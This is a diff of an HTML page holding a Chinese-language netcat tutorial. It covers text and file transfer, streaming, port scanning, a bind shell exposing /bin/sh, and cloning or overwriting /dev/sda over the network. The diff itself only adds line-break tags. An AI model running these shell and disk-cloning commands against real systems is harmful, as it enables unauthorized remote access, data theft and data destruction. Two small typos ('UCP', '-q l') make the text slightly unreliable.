@@ -7541,25 +7541,25 @@
   <h1>Nc使用</h1>
 
 <h2 id="nc">nc使用</h2>
-<p><strong>nc 传输文本</strong>
-首先一台机器要侦听一个端口<strong>（nc -l -p 4444）</strong>
-另外一台机器作为客户端去链接那个端口<strong>（nc -nv 1.1.1.1 4444）</strong>
-nc -lp 333 &gt; result.txt  把结果输出到 result.txt 里面
+<p><strong>nc 传输文本</strong><br />
+首先一台机器要侦听一个端口<strong>（nc -l -p 4444）</strong><br />
+另外一台机器作为客户端去链接那个端口<strong>（nc -nv 1.1.1.1 4444）</strong><br />
+nc -lp 333 &gt; result.txt  把结果输出到 result.txt 里面<br />
 ls | nc -nv 1.1.1.1 333 -q 1 （把ls的结果发送给1.1.1.1的333端口并且结束后的一秒后退出） </p>
-<p><strong>nc 远程控制</strong>
-nc -lp 333 -e /bin/sh
+<p><strong>nc 远程控制</strong><br />
+nc -lp 333 -e /bin/sh<br />
 nc -nv 1.1.1.1 333</p>
-<p><strong>nc 传输文件/目录</strong>
-nc -nv 1.1.1.1 333 &lt; 1.mp4
+<p><strong>nc 传输文件/目录</strong><br />
+nc -nv 1.1.1.1 333 &lt; 1.mp4<br />
 nc -lp 333 &gt; 1.mp4</p>
-<p><strong>nc 流媒体服务</strong>
-cat 1.mp4 | nc -lp 333
+<p><strong>nc 流媒体服务</strong><br />
+cat 1.mp4 | nc -lp 333<br />
 nc -nv 1.1.1.1 333 | mplayer -vo xll -cache 3000 -</p>
-<p><strong>nc 端口扫描</strong>
-nc -nvz 1.1.1.1 1-1024  默认探测的是 TCP 开放的端口
+<p><strong>nc 端口扫描</strong><br />
+nc -nvz 1.1.1.1 1-1024  默认探测的是 TCP 开放的端口<br />
 nc -vnzu 1.1.1.1 1-1024  探测的是 UCP 开放的端口</p>
-<p><strong>nc 远程克隆硬盘</strong>
-nc -lp 333 | dd of=/dev/sda
+<p><strong>nc 远程克隆硬盘</strong><br />
+nc -lp 333 | dd of=/dev/sda<br />
 dd if=/dev/sda | nc -nv 1.1.1.1 333 -q l</p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/iizq89">https://www.yuque.com/hxfqg9/web/iizq89</a></p>
